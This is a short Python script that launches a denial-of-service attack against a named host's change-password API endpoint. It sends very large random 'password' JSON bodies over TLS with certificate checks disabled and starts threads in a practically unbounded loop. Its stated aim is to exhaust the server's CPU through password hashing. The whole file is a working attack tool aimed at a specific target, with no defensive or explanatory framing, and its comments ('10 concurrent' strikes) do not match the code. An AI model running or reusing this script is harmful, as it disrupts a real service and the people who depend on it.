import socket
import ssl
import os

HOST = "fmobile.rpscampus.in"
URL = "/api/changepassword"

def cpu_logic_bomb():
    # 1. Generate 1MB of random high-entropy 'password' data
    # This forces the hashing algorithm to work at maximum capacity
    payload_data = os.urandom(1024 * 512).hex() 
    
    # Constructing a valid-looking JSON but with a massive payload
    json_body = '{"oldPassword":"' + payload_data + '", "newPassword":"' + payload_data + '"}'
    
    try:
        sock = socket.create_connection((HOST, 443), timeout=60)
        context = ssl._create_unverified_context()
        ssock = context.wrap_socket(sock, server_hostname=HOST)

        request = (
            f"POST {URL} HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            "Content-Type: application/json\r\n"
            f"Content-Length: {len(json_body)}\r\n"
            "Connection: close\r\n\r\n"
            f"{json_body}"
        )
        
        print(f"[!] Launching Computational Strike (Payload: {len(json_body)//1024} KB)...")
        ssock.sendall(request.encode())
        
        # We don't wait for the response. We want the server to stay busy.
        ssock.close()
    except Exception as e:
        print(f"[-] Strike Latency Detected: {e}")

if __name__ == "__main__":
    print("--- PROTOCOL: ASYMMETRIC CPU EXHAUSTION (HASH-STRIKE) ---")
    # Launching 10 concurrent math-heavy strikes
    import threading
    for i in range(1000000000000000000000000000000000000000):
        threading.Thread(target=cpu_logic_bomb).start()
